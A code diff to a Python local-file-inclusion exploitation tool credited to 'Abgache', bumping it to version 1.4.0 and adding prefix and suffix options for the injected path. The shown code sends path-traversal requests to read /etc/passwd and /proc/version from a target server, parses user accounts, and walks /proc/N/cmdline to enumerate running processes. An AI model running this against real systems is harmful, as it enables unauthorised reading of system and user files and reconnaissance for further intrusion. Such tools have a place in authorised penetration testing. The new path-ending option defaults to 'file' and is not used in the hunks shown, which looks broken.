@@ -12,7 +12,7 @@ def print_banner():
      |  ___/ '__/ _ \ / __| |     \___ \ 
      | |   | | | (_) | (__| |____ ____) |
      |_|   |_|  \___/ \___|______|_____/"""
-    version = "1.3.1"
+    version = "1.4.0"
     credit = f"{' ' * 34}By Abgache\n{' ' * 34}Version: {version}\n"
     print(banner)
     print(credit)
@@ -41,6 +41,8 @@ def main():
     parser.add_argument("-s", "--path", default="", help="LFI base path")
     parser.add_argument("--max", default=1000, type=int)
     parser.add_argument("--param", default="file", help="LFI parameter name")
+    parser.add_argument("--path-starting", default="file", help="LFI parameter starting point (example: file://)")
+    parser.add_argument("--path-ending", default="file", help="LFI parameter ending point (example: %23 for #)")
 
     args = parser.parse_args()
 
@@ -62,7 +64,7 @@ def main():
 
     print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Target: {base}")
 
-    test_url = f"{base}/{args.path}?{args.param}=../../../../etc/passwd"
+    test_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../etc/passwd"
     test = requests.get(test_url, timeout=3)
 
     if "root:x:" not in test.text:
@@ -75,14 +77,14 @@ def main():
             print(f"{Fore.CYAN}[/]{Style.RESET_ALL} User found: {usr[0]}, Home: {usr[1]}")
         
 
-    ver_url = f"{base}/{args.path}?{args.param}=../../../../proc/version"
+    ver_url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../proc/version"
     ver = requests.get(ver_url, timeout=3)
     print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} OS Version: {ver.text.strip()}\n")
 
     host_len = 0
 
     for i in range(1, args.max + 1):
-        url = f"{base}/{args.path}?{args.param}=../../../../proc/{i}/cmdline"
+        url = f"{base}/{args.path}?{args.param}={args.path_starting}../../../../proc/{i}/cmdline"
 
         try:
             r = requests.get(url, timeout=3)
